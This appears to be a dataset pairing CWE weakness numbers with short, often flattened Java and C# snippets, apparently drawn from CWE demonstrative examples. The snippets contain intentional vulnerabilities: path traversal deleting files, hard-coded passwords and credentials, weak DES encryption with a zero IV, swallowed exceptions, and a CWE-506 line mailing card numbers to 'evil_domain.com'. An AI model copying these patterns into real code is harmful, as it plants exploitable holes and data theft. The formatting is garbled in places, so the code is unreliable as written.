+NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls);
+
+99, String rName = request.getParameter("reportName");
+File rFile = new File("/usr/local/apfr/reports/" + rName);
+...
+rFile.delete();
+
+99,null
+102,null
+462,null
+914,null
+1041, public class Main {   public static void main(String[] args) {      double s = 10.0;
+ double r = 1.0;
+ double pi = 3.14159;
+ double surface_area;
+ if(r > 0.0) {        // complex math equations surface_area = pi * r * s + pi * Math.pow(r, 2);
+    } if(r > 1.0) {        // a complex set of math surface_area = pi * r * s + pi * Math.pow(r, 2);
+    }   }  }
+766,null
+766,null
+1116,public class Main { public static void main(String[] args) {    int pt_weight = 83;
+ int mg_per_kg = 3;
+ int daily_dose = 0;
+  // Add the patient weight and Mg/Kg to calculate the correct daily dose daily_dose = pt_weight * mg_per_kg;
+ return dosage;
+  } }
+546, if (user == null) {    // TODO: Handle null user condition.    }
+547,null
+547,null
+586, // time to clean up widget.finalize();
+
+107, public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {    // private variables for registration form private String name;
+private String address;
+private String city;
+private String state;
+private String zipcode;
+ // no longer using the phone form field   // private String phone;
+ private String email;
+ public RegistrationForm() {       super();
+   }  // getter and setter methods for private variables ...
+   }
+107,null
+1069, public class Main {   public static void main(String[] args) {      int a = 1;
+ int b = 0;
+ int c = 0;
+ try {        c = a / b;
+    } catch(ArithmeticException ae) { }   }  }
+585, synchronized(this) { }
+110, public class DateRangeForm extends ValidatorForm {      String startDate, endDate;
+ public void setStartDate(String startDate) {       this.startDate = startDate;
+   } public void setEndDate(String endDate) {       this.endDate = endDate;
+   }   }
+110,null
+561,null
+561, public class DoubleDead {   private void doTweedledee() {     doTweedledumb();
+  }private void doTweedledumb() {     doTweedledee();
+  }public static void main(String[] args) {     System.out.println("running DoubleDead");
+  } }
+561, public class Dead {      String glue;
+ public String getGlue() {       return "glue";
+   }   }
+563,null
+1209,null
+1329,null
+1277,null
+476,null
+476, String cmd = System.getProperty("cmd");
+cmd = cmd.trim();
+
+476, ...
+ IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");
+MyReceiver receiver = new MyReceiver();
+registerReceiver(receiver, filter);
+ ...
+  public class UrlHandlerReceiver extends BroadcastReceiver {      @Overridepublic void onReceive(Context context, Intent intent) {            if("com.example.URLHandler.openURL".equals(intent.getAction())) {           String URL = intent.getStringExtra("URLToOpen");
+int length = URL.length();
+       ...
+ }       }   }
+477,null
+477, String cmd = null;
+...
+cmd = Environment.GetEnvironmentVariable("cmd");
+cmd = cmd.Trim();
+
+477, ...
+String name = new String(nameBytes, highByte);
+...
+
+484, public void printMessage(int month){      switch (month) {       case 1: print("January");
+case 2: print("February");
+case 3: print("March");
+case 4: print("April");
+case 5: print("May");
+case 6: print("June");
+case 7: print("July");
+case 8: print("August");
+case 9: print("September");
+case 10: print("October");
+case 11: print("November");
+case 12: print("December");
+       }println(" is a great month");
+   }
+484,null
+489,null
+570,public void updateUserAccountOrder(String productNumber, String accountNumber) {      boolean isValidProduct = false;
+boolean isValidAccount = false;
+ if (validProductNumber(productNumber)) {       isValidProduct = true;
+updateInventory(productNumber);
+   }else {       return;
+   } if (validAccountNumber(accountNumber)) {       isValidProduct = true;
+updateAccount(accountNumber, productNumber);
+   } if (isValidProduct &amp;
+&amp;
+ isValidAccount) {       updateAccountOrder(accountNumber, productNumber);
+   }   }
+570,null
+570,null
+571,public void updateInventory(String productNumber) {      boolean isProductAvailable = false;
+boolean isDelayed = false;
+ if (productInStore(productNumber)) {       isProductAvailable = true;
+updateInStoreDatabase(productNumber);
+   }else if (productInWarehouse(productNumber)) {       isProductAvailable = true;
+updateInWarehouseDatabase(productNumber);
+   }else {       isProductAvailable = true;
+   } if ( isProductAvailable ) {       updateProductDatabase(productNumber);
+   }else if ( isDelayed ) {        /* Warn customer about delay before order processing */ ...
+       }   }
+103, public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {   // private variables for registration formprivate String name;
+private String email;
+...
+ public RegistrationForm() {     super();
+  } public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {     ActionErrors errors = new ActionErrors();
+if (getName() == null || getName().length() < 1) {       errors.add("name", new ActionMessage("error.name.required"));
+   }return errors;
+  }     // getter and setter methods for private variables...
+  }
+104, public class RegistrationForm extends org.apache.struts.action.ActionForm {      // private variables for registration formprivate String name;
+private String email;
+...
+ public RegistrationForm() {       super();
+   } // getter and setter methods for private variables...
+   }
+253,null
+296,null
+329,null
+329, public class SymmetricCipherTest {      public static void main() {       byte[] text ="Secret".getBytes();
+byte[] iv ={           0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00     };
+KeyGenerator kg = KeyGenerator.getInstance("DES");
+kg.init(56);
+SecretKey key = kg.generateKey();
+Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
+IvParameterSpec ips = new IvParameterSpec(iv);
+cipher.init(Cipher.ENCRYPT_MODE, key, ips);
+return cipher.doFinal(inpBytes);
+       }   }
+568, protected void finalize() {   discardNative();
+ }
+577, @Statelesspublic class StockSymbolBean implements StockSymbolRemote {   ServerSocket serverSocket = null;
+Socket clientSocket = null;
+ public StockSymbolBean() {            try {           serverSocket = new ServerSocket(Constants.SOCKET_PORT);
+     } catch (IOException ex) {...
+} try {           clientSocket = serverSocket.accept();
+     } catch (IOException e) {...
+}       } public String getStockSymbol(String name) {...
+} public BigDecimal getStockValue(String symbol) {...
+} private void processClientInputFromSocket() {...
+}   }
+577, @Statelesspublic class StockSymbolBean extends Thread implements StockSymbolRemote {   ServerSocket serverSocket = null;
+Socket clientSocket = null;
+boolean listening = false;
+ public StockSymbolBean() {            try {           serverSocket = new ServerSocket(Constants.SOCKET_PORT);
+     } catch (IOException ex) {...
+} listening = true;
+while(listening) {           start();
+     }       } public String getStockSymbol(String name) {...
+} public BigDecimal getStockValue(String symbol) {...
+} public void run() {       try {         clientSocket = serverSocket.accept();
+    } catch (IOException e) {...
+}...
+   }   }
+578, @Statelesspublic class InterestRateBean implements InterestRateRemote {      private Document interestRateXMLDocument = null;
+ public InterestRateBean() {            try {            // get XML document from the local filesystem as an input stream   // using the ClassLoader for this class ClassLoader loader = this.getClass().getClassLoader();
+InputStream in = loader.getResourceAsStream(Constants.INTEREST_RATE_FILE);
+                    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+       DocumentBuilder db = dbf.newDocumentBuilder();
+interestRateXMLDocument = db.parse(interestRateFile);
+   } catch (IOException ex) {...
+}   }      public BigDecimal getInterestRate(Integer points) {       return getInterestRateFromXML(points);
+   }  /* member function to retrieve interest rate from XML document on the local file system */  private BigDecimal getInterestRateFromXML(Integer points) {...
+}   }
+578, @Statelesspublic class LoaderSessionBean implements LoaderSessionRemote {      public LoaderSessionBean() {       try {         ClassLoader loader = new CustomClassLoader();
+Class c = loader.loadClass("someClass");
+Object obj = c.newInstance();
+/* perform some task that uses the new class instance member variables or functions */...
+    } catch (Exception ex) {...
+}   } public class CustomClassLoader extends ClassLoader { }   }
+579, public class DataGlob {      String globName;
+String globValue;
+ public void addToSession(HttpSession session) {       session.setAttribute("glob", this);
+   }   }
+580, public class Kibitzer {      public Object clone() throws CloneNotSupportedException {       Object returnMe = new Kibitzer();
+...
+       }   } public class FancyKibitzer extends Kibitzer{      public Object clone() throws CloneNotSupportedException {       Object returnMe = super.clone();
+...
+       }   }
+628,null
+628,null
+628, private static final String[] ADMIN_ROLES = ...
+;
+public boolean void accessGranted(String resource, String user) {   String[] userRoles = getUserRoles(user);
+return accessGranted(resource, ADMIN_ROLES);
+ } private boolean void accessGranted(String resource, String[] userRoles) {    // grant or deny access based on user roles ...
+   }
+683,null
+687,null
+1341,null
+1341,null
+605,null
+102,null
+462,null
+111, class Echo {   public native void runEcho();
+static {       System.loadLibrary("echo");
+       }public static void main(String[] args) {       new Echo().runEcho();
+       }   }
+111,null
+245, public class DatabaseConnection {      private static final String CONNECT_STRING = "jdbc:mysql://localhost:3306/mysqldb";
+private Connection conn = null;
+ public DatabaseConnection() {} public void openDatabaseConnection() {       try {         conn = DriverManager.getConnection(CONNECT_STRING);
+    } catch (SQLException ex) {...
+}   } // Member functions for retrieving database connection and accessing database...
+   }
+246, public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {    // Perform servlet tasks. ...
+  // Open a socket to a remote server (bad). Socket sock = null;
+ try {            sock = new Socket(remoteHostname, 3000);
+  // Do something with the socket. ...
+       } catch (Exception e) {       ...
+   }   }
+383, public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {    // Perform servlet tasks. ...
+  // Create a new thread to handle background processing. Runnable r = new Runnable() {            public void run() {            // Process and store request statistics. ...
+           }       };
+ new Thread(r).start();
+   }
+574, @Entitypublic class Customer implements Serializable {      private String id;
+private String firstName;
+private String lastName;
+private Address address;
+ public Customer() {...
+} public Customer(String id, String firstName, String lastName) {...
+} @Idpublic String getCustomerId() {...
+} public synchronized void setCustomerId(String id) {...
+} public String getFirstName() {...
+} public synchronized void setFirstName(String firstName) {...
+} public String getLastName() {...
+} public synchronized void setLastName(String lastName) {...
+} @OneToOne()public Address getAddress() {...
+} public synchronized void setAddress(Address address) {...
+}   }
+575, @Statelesspublic class ConverterSessionBean extends Component implements KeyListener, ConverterSessionRemote {    /* member variables for receiving keyboard input using AWT API */  ...
+private StringBuffer enteredText = new StringBuffer();
+  /* conversion rate on US dollars to Yen */  private BigDecimal yenRate = new BigDecimal("115.3100");
+ public ConverterSessionBean() {            super();
+ /* method calls for setting up AWT Component for receiving keyboard input */  ...
+addKeyListener(this);
+       } public BigDecimal dollarToYen(BigDecimal dollars) {       BigDecimal result = dollars.multiply(yenRate);
+return result.setScale(2, BigDecimal.ROUND_DOWN);
+   }  /* member functions for implementing AWT KeyListener interface */  public void keyTyped(KeyEvent event) {       ...
+   } public void keyPressed(KeyEvent e) {} public void keyReleased(KeyEvent e) {}  /* member functions for receiving keyboard input and displaying output */  public void paint(Graphics g) {...
+} ...
+   }
+576, @Statelesspublic class InterestRateBean implements InterestRateRemote {      private Document interestRateXMLDocument = null;
+private File interestRateFile = null;
+ public InterestRateBean() {            try {            /* get XML document from the local filesystem */ interestRateFile = new File(Constants.INTEREST_RATE_FILE);
+ if (interestRateFile.exists()){               DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+DocumentBuilder db = dbf.newDocumentBuilder();
+interestRateXMLDocument = db.parse(interestRateFile);
+       }           } catch (IOException ex) {...
+}       } public BigDecimal getInterestRate(Integer points) {       return getInterestRateFromXML(points);
+   }  /* member function to retrieve interest rate from XML document on the local file system */  private BigDecimal getInterestRateFromXML(Integer points) {...
+}   }
+594, @Entitypublic class Customer {      private String id;
+private String firstName;
+private String lastName;
+private Address address;
+ public Customer() {} public Customer(String id, String firstName, String lastName) {...
+} @Idpublic String getCustomerId() {...
+} public void setCustomerId(String id) {...
+} public String getFirstName() {...
+} public void setFirstName(String firstName) {...
+} public String getLastName() {...
+} public void setLastName(String lastName) {...
+} @OneToOne()public Address getAddress() {...
+} public void setAddress(Address address) {...
+}     }
+250,null
+250,null
+250, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+Location userCurrLocation;
+userCurrLocation = locationClient.getLastLocation();
+setTimeZone(userCurrLocation);
+
+250,null
+250, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+Location userCurrLocation;
+userCurrLocation = locationClient.getLastLocation();
+deriveStateFromCoords(userCurrLocation);
+
+455,null
+308,null
+308, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+309,null
+309, String plainText = new String(plainTextIn);
+MessageDigest encer = MessageDigest.getInstance("SHA");
+encer.update(plainTextIn);
+byte[] digest = password.digest();
+ //Login if hash matches stored hash if (equal(digest,secret_password())) {   login_user();
+ }
+798, ...
+DriverManager.getConnection(url, "scott", "tiger");
+...
+
+798,null
+798, int VerifyAdmin(String password) {   if (!password.equals("Mew!")) {     return(0)  }//Diagnostic Modereturn(1);
+ }
+798,null
+798, public boolean VerifyAdmin(String password) {   if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {     System.out.println("Entering Diagnostic Mode...
+");
+return true;
+  }System.out.println("Incorrect Password!");
+return false;
+ 
+798,null
+798, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+798,null
+259, ...
+DriverManager.getConnection(url, "scott", "tiger");
+...
+
+259,null
+259, int VerifyAdmin(String password) {   if (!password.equals("Mew!")) {     return(0)  }//Diagnostic Modereturn(1);
+ }
+259, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+259,null
+321,null
+321, public boolean VerifyAdmin(String password) {   if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {     System.out.println("Entering Diagnostic Mode...
+");
+return true;
+  }System.out.println("Incorrect Password!");
+return false;
+ 
+321,null
+1245,null
+392, try {    // Something that may throw an exception. ...
+   } catch (Throwable t) {   logger.error("Caught: " + t.toString());
+return;
+ }
+393, try {    // something that might throw IOException ...
+   } catch (IOException ioe) {   response.sendError(SC_NOT_FOUND);
+ }
+506, boolean authorizeCard(String ccn) {    // Authorize credit card.   ...
+  mailCardNumber(ccn, "evil_developer@evil_domain.com");
+   }
+588,null
